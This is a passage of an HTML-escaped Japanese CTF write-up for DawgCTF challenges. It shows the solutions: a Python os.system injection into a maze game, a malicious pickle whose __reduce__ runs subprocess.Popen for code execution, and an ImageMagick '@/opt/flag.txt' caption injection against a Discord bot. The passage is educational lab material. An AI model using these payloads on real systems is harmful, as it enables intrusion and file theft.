+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                d &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [(x &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, y), (x, y &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;), (x &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, y), (x, y &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)]
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                shuffle(d)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (xx, yy) &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; d:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; vis[yy][xx]: &lt;span style=&#34;color:#66d9ef&#34;&gt;continue&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; xx &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; x: hor[max(y, yy)][x] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;+  &amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; yy &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; y: ver[y][max(x, xx)] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;   &amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                        walk(xx, yy)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        walk(randrange(w), randrange(h))
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        s &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (a, b) &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; zip(hor, ver):
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                s &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;join(a &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; [&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; b &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; [&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;])
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        s &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;replace(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34; &amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;O&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        s &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; replace_last(s, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;  &amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;FF&amp;#34;&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; s
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;__main__&lt;/span&gt;():
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        welcome()
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        still_playing &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        maze &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; make_maze()
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt;(still_playing):
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                still_playing &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; make_move(maze)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        print &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Congrats! You&amp;#39;ve finished the maze! Here&amp;#39;s your flag:&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        os&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;system(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/bin/cat flag.txt&amp;#34;&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;__main__()
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;code&gt;__main__()&lt;/code&gt;関数を見ると&lt;code&gt;os.system(&amp;quot;/bin/cat flag.txt&amp;quot;)&lt;/code&gt;とあるので、そのまま&lt;code&gt;make_move(os.system(&amp;quot;/bin/cat flag.txt&amp;quot;))&lt;/code&gt;を渡すとフラグが得られます。&lt;/p&gt;
+&lt;h2 id=&#34;jellyspotters&#34;&gt;Jellyspotters&lt;/h2&gt;
+&lt;h3 id=&#34;問題-1&#34;&gt;問題&lt;/h3&gt;
+&lt;p&gt;&lt;strong&gt;100 points&lt;/strong&gt;&lt;br&gt;
+The leader of the Jellyspotters has hired you to paint them a poster for their convention, using this painting program. Also, the flag is in ~/flag.txt.&lt;/p&gt;
+&lt;p&gt;nc umbccd.io 4200&lt;/p&gt;
+&lt;p&gt;Author: nb&lt;/p&gt;
+&lt;h3 id=&#34;解説-1&#34;&gt;解説&lt;/h3&gt;
+&lt;p&gt;ncコマンドで接続すると描画プログラムのシェルのようなものがあります。helpを確認して少し操作してみると以下のようになります。&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Welcome to the Paint Program!
+Paint us a new poster for the Jellyspotters 2021 convention. Make Kevin proud.
+Type &amp;#39;help&amp;#39; for help.
+&amp;gt; help
+Listing commands...
+display             Display the canvas
+clearall            Clear the canvas
+set [row] [col]     Set a particular pixel
+clear [row] [col]   Clear a particular pixel
+export              Export the canvas state
+import [canvas]     Import a previous canvas
+exit                Quit the program
+&amp;gt; display
+##################
+#                #
+#                #
+#                #
+#                #
+#                #
+#                #
+#                #
+#                #
+#                #
+#                #
+#                #
+#                #
+#                #
+#                #
+#                #
+#                #
+##################
+&amp;gt; set 5 5
+##################
+#                #
+#                #
+#                #
+#                #
+#                #
+#     0          #
+#                #
+#                #
+#                #
+#                #
+#                #
+#                #
+#                #
+#                #
+#                #
+#                #
+##################
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;exportとimportは以下のような使い方ができます。表示形式はBase64のようですが、デコードしてもそのまま読めるような形にはなりませんでした。&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;gt; export
+Exported canvas string:
+gASVSQIAAAAAAABdlChdlCiMASCUaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCZV2UKGgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCZV2UKGgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCZV2UKGgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCZV2UKGgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCZV2UKGgCaAJoAmgCaAKMATCUaAJoAmgCaAJoAmgCaAJoAmgCaAJlXZQoaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJlXZQoaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJlXZQoaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJlXZQoaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJlXZQoaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJlXZQoaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJlXZQoaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJlXZQoaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJlXZQoaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJlXZQoaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJlZS4=
+&amp;gt; import gASVSQIAAAAAAABdlChdlCiMASCUaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCZV2UKGgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCZV2UKGgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCZV2UKGgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCZV2UKGgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCZV2UKGgCaAJoAmgCaAKMATCUaAJoAmgCaAJoAmgCaAJoAmgCaAJlXZQoaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJlXZQoaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJlXZQoaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJlXZQoaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJlXZQoaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJlXZQoaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJlXZQoaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJlXZQoaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJlXZQoaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJlXZQoaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJoAmgCaAJlZS4=
+Importing...
+Done!
+##################
+#                #
+#                #
+#                #
+#                #
+#                #
+#     0          #
+#                #
+#                #
+#                #
+#                #
+#                #
+#                #
+#                #
+#                #
+#                #
+#                #
+##################
+&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;何かヒントが欲しいのでimportでエラーを吐きそうな適当な引数を渡します。&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;gt; import a
+Importing...
+Traceback (most recent call last):
+  File &amp;#34;/home/challuser/jellyspotters.py&amp;#34;, line 67, in &amp;lt;module&amp;gt;
+    imp = pickle.loads(base64.b64decode(split[1]))
+  File &amp;#34;/usr/lib/python3.8/base64.py&amp;#34;, line 87, in b64decode
+    return binascii.a2b_base64(s)
+binascii.Error: Invalid base64-encoded string: number of data characters (1) cannot be 1 more than a multiple of 4
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Pythonでpickleを使ってPythonオブジェクトを変換しBase64エンコードをしているみたいなので、ローカルで同じことをすればPythonオブジェクトに復元したり、好きなPythonオブジェクトをimportで渡したりできそうです。&lt;br&gt;
+復元してみると二次元リストだということが分かるので、以下のコードで適当なデータでBase64文字列を作り、渡してみます。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; pickle
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; base64
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;data &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    [&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;a&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;b&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;c&amp;#34;&lt;/span&gt;],
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    [&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;d&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;e&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;f&amp;#34;&lt;/span&gt;],
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;]
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;p &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; pickle&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;dumps(data)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;print(base64&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;b64encode(p))
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;出力&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;b&amp;#39;gASVJQAAAAAAAABdlChdlCiMAWGUjAFilIwBY5RlXZQojAFklIwBZZSMAWaUZWUu&amp;#39;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;importに渡してみるとこうなります。&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;gt; import gASVJQAAAAAAAABdlChdlCiMAWGUjAFilIwBY5RlXZQojAFklIwBZZSMAWaUZWUu
+Importing...
+Done!
+##################
+#abc#
+#def#
+##################
+&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;どうにかして内部のファイルを出力するような関数を実行させたいところですが、静的なオブジェクトしか渡せないのでどうすればよいか考えました。考えても思いつかなかったので「pickle vulnerability」とかで検索すると任意コード実行の脆弱性(参考: &lt;a href=&#34;https://blog.nelhage.com/2011/03/exploiting-pickle/&#34;&gt;https://blog.nelhage.com/2011/03/exploiting-pickle/&lt;/a&gt;)がありました。&lt;br&gt;
+これを利用して以下のコードを書いて出力をimportに渡せばフラグが得られます。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; pickle
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; base64
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; subprocess
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;RunShell&lt;/span&gt;(object):
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;__reduce__&lt;/span&gt;(self):
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; (subprocess&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;Popen, ((&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;cat&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;flag.txt&amp;#39;&lt;/span&gt;),))
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;r &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; RunShell()
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;p &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; pickle&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;dumps(r)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;print(base64&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;b64encode(p))
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;mdl-considered-harmful&#34;&gt;MDL Considered Harmful&lt;/h2&gt;
+&lt;h3 id=&#34;問題-2&#34;&gt;問題&lt;/h3&gt;
+&lt;p&gt;&lt;strong&gt;225 points&lt;/strong&gt;&lt;br&gt;
+There&amp;rsquo;s a bot named MDLChef in the Discord. You need to DM it, it doesn&amp;rsquo;t respond in the server. On its host machine, there&amp;rsquo;s a file at /opt/flag.txt - it contains the flag. Go get it.&lt;/p&gt;
+&lt;p&gt;Note: This is NOT an OSINT challenge. The source code really isn&amp;rsquo;t available. Good luck.&lt;/p&gt;
+&lt;p&gt;Author: nb&lt;/p&gt;
+&lt;h3 id=&#34;解説-2&#34;&gt;解説&lt;/h3&gt;
+&lt;p&gt;DawgCTFのDiscordサーバーにMDLChefというBotがいて、「DM me and say /help」とのことなのでDMに/helpを送ります。&lt;/p&gt;
+&lt;p&gt;以下の返信が来ます。&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;strong&gt;MDLChef Bot&lt;/strong&gt;&lt;br&gt;
+This bot generates memes using MDL, the Meme Description Language.&lt;br&gt;
+Here is an example of a valid MDL sample:&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-json&#34; data-lang=&#34;json&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;version:&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;MDL/1.1&amp;#34;&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;type:&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;meme&amp;#34;&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;base:&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;format:&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;Meme.Matrix.WhatIfIToldYou&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;,&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;caption:&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;topText:&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;what if i told you&amp;#34;&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;bottomText:&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;you can code your memes&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
+&lt;p&gt;Just send a valid MDL snippet in the DM and the bot will automatically recognize it and respond.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;提示されたMDL sampleを送信してみるとミーム画像が返されました。&lt;br&gt;
+/helpはスラッシュコマンドだったので、/を打って候補に出る他のコマンドも試してみます。&lt;br&gt;
+/creditsを送信すると以下の返信が来ます。&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;strong&gt;Credits&lt;/strong&gt;&lt;br&gt;
+Thank you to&amp;hellip;&lt;br&gt;
+- The Rust programming language&lt;br&gt;
+- The Serenity Discord library&lt;br&gt;
+- The ImageMagick caption command for meme generation&lt;br&gt;
+Note: The source code for this bot is NOT publicly available, due to the CyberDawgs&amp;rsquo; extreme anti-open-source and pro-proprietary stance. We don&amp;rsquo;t NEED public auditing. All of the code in this bot is totally and completely secure.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;Rust、Serenity Discordライブラリ、ImageMagickのcaptionコマンドを使っているということなので、それぞれで内部ファイルを読み込んで表示できそうな脆弱性がないか検索してみると、「imagemagick caption from file」で検索してImageMagickのcaptionコマンドでファイルから読み込んでテキストを画像に書き込める機能(参考: &lt;a href=&#34;https://legacy.imagemagick.org/discourse-server/viewtopic.php?t=31322&#34;&gt;https://legacy.imagemagick.org/discourse-server/viewtopic.php?t=31322&lt;/a&gt;)が見つかりました。&lt;/p&gt;
+&lt;p&gt;以下のMDLを送るとフラグが手に入ります。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-json&#34; data-lang=&#34;json&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;version:&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;MDL/1.1&amp;#34;&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;type:&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;meme&amp;#34;&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;base:&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;format:&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;Meme.DrakeYesNo&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;,&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;caption:&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;topText:&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;@/opt/flag.txt&amp;#34;&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;bottomText:&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;/opt/flag.txt&amp;#34;&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;,&lt;/span&gt;
